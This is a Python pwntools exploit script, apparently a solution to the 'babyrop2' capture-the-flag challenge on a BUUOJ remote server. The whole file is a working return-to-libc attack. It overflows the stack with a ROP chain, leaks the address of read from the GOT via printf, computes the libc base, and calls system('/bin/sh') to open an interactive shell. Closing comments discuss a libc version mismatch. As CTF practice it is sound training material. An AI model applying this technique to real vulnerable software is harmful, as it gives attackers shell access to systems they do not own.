from pwn import *

context(arch="amd64", os="linux", log_level="debug")

exe = ELF("./babyrop2")
# libc = exe.libc
# r = exe.process()
libc = ELF("./libc.so.6")
r = remote("node4.buuoj.cn", 26217)

# 0x0000000000400733 : pop rdi ; ret
# 0x0000000000400731 : pop rsi ; pop r15 ; ret
# 0x00000000004004d1 : ret

pop_rdi = p64(0x400733)
pop_rsi_r15 = p64(0x400731)
ret = p64(0x4004D1)

r.recvuntil(b"? ")
r.send(
    cyclic(0x28)
    + pop_rdi
    + p64(0x400770)
    + pop_rsi_r15
    + p64(exe.got["read"])
    + p64(0)
    + p64(exe.plt["printf"])
    + p64(exe.sym["main"])
)
r.recvline()
r.recvuntil(b"again, ")
libc_read = u64(r.recv(6).ljust(8, b"\x00"))
success("libc read: " + hex(libc_read))
libc_base = libc_read - libc.sym["read"]
libc_system = libc_base + libc.sym["system"]
libc_bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
r.recvuntil(b"? ")
r.send(cyclic(0x28) + ret + pop_rdi + p64(libc_bin_sh) + p64(libc_system))
r.interactive()

# can't use printf got table address to get libc base but can run successfully at localhost, maybe a libc version issue
# edit: irrelevant to stack alignment cause server's ubuntu version<=18.04